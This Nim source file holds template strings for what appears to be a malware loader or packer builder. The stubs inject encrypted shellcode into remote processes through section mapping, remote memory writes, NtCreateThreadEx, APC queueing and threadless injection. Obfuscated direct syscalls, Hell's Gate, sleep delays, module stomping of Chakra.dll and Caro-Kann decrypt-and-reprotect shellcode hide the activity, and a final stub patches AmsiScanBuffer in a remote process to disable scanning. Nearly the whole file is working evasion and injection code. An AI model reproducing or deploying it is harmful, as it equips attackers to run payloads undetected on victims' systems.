let ShellcodeRemoteInjectMapSection * = """

        var pHandle2: HANDLE = -1 # Current Process Handle

        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
            lpMapAddressRemote: PVOID = NULL
            lpMapAddress: PVOID = NULL

        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(AllocateDripStyle):
                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
                if lpMapAddressRemote == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
                        
                # NtCreateSection Call
                
                var 
                    hMapFile: HANDLE
                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

                status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)

                var
                    vSize: SIZE_T = sc_size
                # NtMapViewOfSection Call local
                status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                when defined(verbose):
                    echo obf("[*] NtMapViewOfSection: "), toHex(status)
                if (lpMapAddress == nil):
                    echo obf("[-] Failed to map view of file")
                    echo GetLastError()
                
                echo obf("[*] Moving shellcode to memory...")
                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))                
                
                # Why did I use NtWrite here instead of local copy.. No one knows.
                # var bytesWritten: SIZE_T
                # NtWriteVirtualMemory Call
                #status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)

                #when defined(verbose):
                #    echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                #    echo obf("    \\-- bytes written: "), bytesWritten
                #    echo obf("")

                
                # NtMapViewOfSection Call remote
                when defined(RX):
                    protectionValue = PAGE_EXECUTE_READ
                
                status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
                
                if (lpMapAddressRemote == nil):
                    echo obf("[-] Failed to map view of file remote")
                    echo toHex(status)
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                ptrEncText = cast[ptr byte](lpMapAddress)
                ptrDecText = cast[ptr byte](lpMapAddress)
                decryptlate()
            
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)

            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)

            when defined(verbose):
                echo success
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
            
            when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
        

            when defined(AllocateDripStyle):
                lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
                if lpMapAddressRemote == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                when defined(Hellsgate):
                    if getSyscall(ntCreateSectionTable):
                        syscall = ntCreateSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateSection")
                
                # NtCreateSection Call
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
            
                var 
                    hMapFile: HANDLE
                    sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

                status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
                when defined(verbose):
                    echo obf("[*] NtCreateSection: "), toHex(status)
                
                if (hMapFile == 0):
                    echo obf("[-] Failed to create file mapping")
                    echo GetLastError()
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                
                var
                    vSize: SIZE_T = sc_size

                status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

                when defined(verbose):
                    echo obf("[*] NtMapViewOfSection: "), toHex(status)

                if (lpMapAddress == nil):
                    echo obf("[-] Failed to map view of file")
                    echo GetLastError()
            

                echo obf("[*] Moving shellcode to memory...")
                moveMemory(lpMapAddress, cast[pointer](unsafeAddr friendlycode), int(sc_size))  
                
                when defined(Hellsgate):
                    if getSyscall(ntMapViewOfSectionTable):
                        syscall = ntMapViewOfSectionTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
                
                when defined(RX):
                    protectionValue = PAGE_EXECUTE_READ
                status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
                
                if (lpMapAddressRemote == nil):
                    echo obf("[-] Failed to map view of file remote")
                    echo toHex(status)
            
            when defined(QueueAPC):
                # first create the sleep Thread before sleeping in between, because that could trigger memory scans
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            
            when defined(AllocateDripStyle):
                lpMapAddress = decryptbuffer
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
            
            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
            
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](lpMapAddressRemote)
                #var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
                decryptlate()
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, lpMapAddressRemote, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
                #when defined(sleepinbetween):
                #    HowMuchTimeWouldYouLikeToSleep(5)
                #Sleep(10)
                #decryptlate()
            else:
                decryptlate()
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    lpMapAddressRemote, 
                    NULL, FALSE, 0, 0, 0, NULL)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)

    injectCreateRemoteThread(enctext) 

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""


let ShellcoderemoteinjectStub * = """
    
        var pHandle2: HANDLE = -1 # Current Process Handle
        
        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
            

            when defined(AllocateDripStyle):
                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
                if ds == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                var protectionValue: DWORD = PAGE_EXECUTE_READWRITE        
                when defined(RX):
                    protectionValue = PAGE_READWRITE
                when defined(RWX):
                    protectionValue = PAGE_EXECUTE_READWRITE
                status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                when defined(verbose):
                    echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
                var bytesWritten: SIZE_T
                
                ptrEncText = cast[ptr byte](addr encText[0])
                ptrDecText = cast[ptr byte](addr decText[0])
                decryptlate()

                status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

                when defined(verbose):
                    echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo obf("")
            
            when defined(JmpEntry):
                var newEntry: LPVOID
                newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
                when defined(verbose):
                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"
            
            when defined(JmpEntry):
                    ds = newEntry
            
            when defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                status = uashdiasdj(tProcess,&ds,&sc_size,PAGE_EXECUTE_READ,addr oldProtection)
                when defined(verbose):
                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                    if (status == 0):
                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                if(status != 0):
                    quit(1)

            when not defined(RX):
                when defined(sleepinbetween):
                    when defined(verbose):
                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            

            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            
            when defined(JmpEntry):
                Sleep(1000)
                if(restoreBytes(tProcess, ds)):
                    when defined(verbose):
                        echo obf("[*] Restored bytes!")
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to restore bytes!")
            
            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(tProcess)
 
        else:

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
        
            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), status
        
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
            

            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
        
            when defined(RX):
                protectionValue = PAGE_READWRITE
            when defined(RWX):
                protectionValue = PAGE_EXECUTE_READWRITE
            
            when defined(AllocateDripStyle):
                ds = DripAllocate(tProcess, cast[SIZE_T](friendlycode.len), friendlycode)
                if ds == nil:
                    when defined(verbose):
                        echo obf("[-] DripAllocation Failed")
                    quit(1)
                else:
                    when defined(verbose):
                        echo obf("[+] DripAllocation Success!")
            else:
                status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                when defined(verbose):
                    echo obf("[*] NtAllocateVirtualMemory: "), status
            
            var bytesWritten: SIZE_T
            
            when defined(JmpEntry):
                var newEntry: LPVOID
                newEntry = prepEntry(tProcess, ds, jmpMod, jmpFunc)
                when defined(verbose):
                    echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry)), "\r\n"

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
            when defined(QueueAPC):
                # Do the Sleep Thread creation before decrypting, as that could lead to memory scans.
                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)

            when defined(sleepinbetween):
                when defined(verbose):
                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            
            when not defined(AllocateDripStyle):
                ptrEncText = cast[ptr byte](addr encText[0])
                ptrDecText = cast[ptr byte](addr decText[0])
                decryptlate()

                status = NtWriteVirtualMemory(
                    tProcess, 
                    ds, 
                    unsafeAddr friendlycode, 
                    sc_size-1, 
                    addr bytesWritten)

                when defined(verbose):
                    echo obf("[*] NtWriteVirtualMemory: "), status
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo obf("")
                
                when not defined(carokann):
                    when defined(RX):
                        when defined(Hellsgate):
                            if getSyscall(ntProtectTable):
                                syscall = ntProtectTable.wSysCall
                            else:
                                when defined(verbose):
                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                        when defined(sleepinbetween):
                            when defined(verbose):
                                echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                        
                        status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
                        when defined(verbose):
                            echo obf("[*] NtProtectVirtualMemory: "), status
                            if (status == 0):
                                echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
                        if(status != 0):
                            quit(1)
                
                when not defined(RX):
                    when defined(sleepinbetween):
                        when defined(verbose):
                            echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)

            when defined(carokann):
                var protectAddress: LPVOID = ds
                var oldProtect: DWORD
                when defined(JmpEntry):
                    var tempdsAddress = ds
                    ds = newEntry

                const hookShellcode = slurp"decryptprotect.bin.tmp"

                var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

                var hook_sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)

                var rPtr2: LPVOID

                when defined(verbose):
                    echo  obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect")
                

                when defined(stomb):
                    var module = GetRemoteModuleHandle(tProcess, obf("Chakra.dll"))
                    when defined(verbose):
                        echo obf("[*] Using Chakra.dll .text section as shellcode buffer")
                        echo obf("[*] Found Chakra.dll baseAddress at: "), repr(rPtr2)
                    #rPtr2 = getTextSectionStart(rPtr2)
                    rPtr2 = GetRemoteProcAddress(tProcess, module, obf("DLLCanUnloadNow"))
                    #rPtr2 = rPtr2
                    when defined(verbose):
                        echo obf("[*] Found Chakra.dll .text section at: "), repr(rPtr2)
                    
                    protectAddress = rPtr2
                    # as the function won't start at the section start, the protectAddress will have an
                    # offset to the address where we write the shellcode later on. This could lead to a problem,
                    # if the shellcode is too big and the function is not at the end of the section. 
                    # So we need to calculate the difference between the section start and the function start and may need to protect one more section
                    # Or we just allocate one more 4kB page so make sure the offset is no problem
                    var allocateSize: SIZE_T = sc_size2 + 0x1000
                    status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
                        else:
                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                            quit(1)

                else:
                    when defined(Hellsgate):
                        if getSyscall(ntAllocTable):
                            syscall = ntAllocTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

                    status = NtAllocateVirtualMemory(
                        tProcess,
                        addr rPtr2,
                        0,
                        addr hook_sc_size,
                        MEM_COMMIT or MEM_RESERVE,
                        PAGE_READWRITE)
                    when defined(verbose):
                        if (status == 0):
                            echo obf("[+] NtAllocateVirtualMemory for Caro-Kann shellcode success "), repr(rPtr2)
                        else:
                            echo obf("[-] NtAllocateVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2)
                            quit(1)

                # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
                # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address

                var eggIndex = 0

                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the egg, which will be filled with the first shellcodes memory address")

                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        eggIndex = i
                        break

                when defined(verbose):
                    echo obf("[*] Writing allocated memory address into egg")

                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)

                when defined(verbose):
                    echo obf("[*] Done.")

                # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address


                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the second egg, which will be filled the same address but to jump there at the end")

                eggIndex = 0

                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        # our 0x00 bytes start at position three, so we need to add three to the index
                        eggIndex = i + 2
                        break

                when defined(verbose):
                    echo obf("[*] Writing memory address into the jump at the end")

                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr ds, 8)

                # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)

                eggIndex = 0

                when defined(verbose):
                    echo obf("-------------------------------------------------------------")
                    echo obf("[*] Looking for the third egg, which will be filled with the shellcodes size")

                for i in 0 ..< hookShellcodeBytes.len:
                    if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
                        when defined(verbose):
                            echo obf("[*] Found egg at index: "), i
                        eggIndex = i
                        break

                when defined(verbose):
                    echo obf("[*] Writing shellcode length into egg: "), originalscLength
                
                when defined(stomb):
                    # We need to find and overwrite the egg 0x9999999999999999 with the address of the protectAddress, so that our shellcode knows where to re-protect
                    eggIndex = 0
                    when defined(verbose):
                        echo obf("-------------------------------------------------------------")
                        echo obf("[*] Looking for the fifth egg, which will be filled with the address of the memory address to re-protect")
                    
                    for i in 0 ..< hookShellcodeBytes.len:
                        if (hookShellcodeBytes[i] == 0x99) and (hookShellcodeBytes[i+1] == 0x99) and (hookShellcodeBytes[i+2] == 0x99) and (hookShellcodeBytes[i+3] == 0x99) and (hookShellcodeBytes[i+4] == 0x99) and (hookShellcodeBytes[i+5] == 0x99) and (hookShellcodeBytes[i+6] == 0x99) and (hookShellcodeBytes[i+7] == 0x99):
                            when defined(verbose):
                                echo obf("[*] Found egg at index: "), i
                            eggIndex = i
                            break

                    when defined(verbose):
                        echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)

                var shellcodeSize: DWORD = cast[DWORD](originalscLength)
                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)

                # Finally write the decryptprotect.bin shellcode into the remote process
                
                when defined(Hellsgate):
                    if getSyscall(ntWriteTable):
                        syscall = ntWriteTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

                status = NtWriteVirtualMemory(tProcess, rPtr2, unsafeAddr hookShellcodeBytes[0], hook_sc_size, addr bytesWritten)

                if (status == 0):
                    when defined(verbose):
                        echo obf("[+] NtWriteVirtualMemory for Caro-Kann shellcode success! "), repr(rPtr2)
                        echo obf("    \\-- bytes written: "), bytesWritten
                        echo obf("")
                else:
                    when defined(verbose):
                        echo obf("[-] NtWriteVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2) ," ",  toHex(status)
                    quit(1)

                # Setting permissions to RX via VirtualProtectEx

                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                #var oldProtect: DWORD
                protectAddress = rPtr2
                status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)

                if (status == 0):
                    when defined(verbose):
                        echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectAddress)
                        echo obf("    \\-- old protection: "), oldProtect
                        echo obf("")
                else:
                    when defined(verbose):
                        echo obf("[-] NtProtectVirtualMemory for Caro-Kann shellcode failed!")
                    quit(1)
                
                # as the execute primitive should now execute our custom shellcode, we need to set ds to the address of the shellcode. 
                # It will automatically jump to the regular shellcode after sleep, decryption and re-protect.
                ds = rPtr2

            when defined(threadless):
                # Use GetRemoteModuleHandle and GetRemoteProcAddress to check for threadlessDLL and threadlessFunction
                # if threadlessDLL == ntdll.dll we can also query the address from the local process as they are equal
                var remoteProc: LPVOID
                if(threadlessDLL == obf("ntdll.dll")):
                    var localHandle = GetModuleHandle(threadlessDLL)
                    if localHandle == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to get handle for local "), threadlessDLL
                        quit(1)
                    var localProc = GetProcAddress(localHandle, threadlessFunction)
                    if localProc == NULL:
                        when defined(verbose):
                            echo obf("[-] Failed to get address of "), threadlessFunction
                        quit(1)
                    when defined(verbose):
                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](localProc)), "\r\n"
                    remoteProc = localProc
                else:
                    var remoteHandle = GetRemoteModuleHandle(tProcess, threadlessDLL)
                    if remoteHandle == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to get handle for "), threadlessDLL
                        quit(1)
                    remoteProc = GetRemoteProcAddress(tProcess, remoteHandle, threadlessFunction)
                    if remoteProc == NULL:
                        when defined(verbose):
                            echo obf("[-] Failed to get address of "), threadlessFunction
                        quit(1)
                    when defined(verbose):
                        echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](remoteProc)), "\r\n"
                
                # Call threadlessThread with target process, shellcode address and targetFunction address
                var threadlessSuccess: bool = threadlessThread(tProcess, ds, remoteProc)
                if threadlessSuccess == false:
                    when defined(verbose):
                        echo obf("[-] Failed to create threadless thread")
                    quit(1)
                when defined(verbose):
                    echo obf("[+] Threadless thread created successfully")
                quit(0)


            when defined(QueueAPC):
                when defined(Hellsgate):
                    if getSyscall(ntQueueApcThreadTable):
                        syscall = ntQueueApcThreadTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
                when defined(JmpEntry):
                    ds = newEntry
                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](ds)
                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, ds, nil, nil)
                when defined(verbose):
                    echo obf("[*] NtQueueApcThread: "), toHex(status)
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(tProcess, ds)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")

            else:
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                when defined(JmpEntry):
                    ds = newEntry
                status = NtCreateThreadEx(
                    &tHandle, 
                    THREAD_ALL_ACCESS, 
                    NULL, 
                    tProcess,
                    ds, 
                    NULL, FALSE, 0, 0, 0, NULL)
                
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                
                when defined(JmpEntry):
                    Sleep(1000)
                    if(restoreBytes(tProcess, ds)):
                        when defined(verbose):
                            echo obf("[*] Restored bytes!")
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to restore bytes!")

                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")

                status = NtClose(tHandle)
                status = NtClose(tProcess)

    

    injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory

when not defined(proxy):
    when defined(defaultMain):
        when not defined(service):
            when not defined(cloned):
                discard main(nil)

"""

let ShellcoderemoteinjectStub_notepad * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = remoteProcID

"""

let ShellcoderemoteinjectStub_customprocfirst * = """

    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            when defined(verbose):
                echo obf("Process ID not found")

    var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        when defined(verbose):
            echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    when defined(verbose):
        echo obf("[*] Target Process: "), processID
    var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

"""


let RemotePatchAMSIStub* = """

    proc RemotePatchAmsi(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x75] # Patch JZ to JNZ
        elif defined i386:
            let patch: array[1, byte] = [byte 0x75] 


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get amsi.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled
        when defined amd64:
            RemoteProc = RemoteProc + 0x6D
        else:
            RemoteProc = RemoteProc + 0x47
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
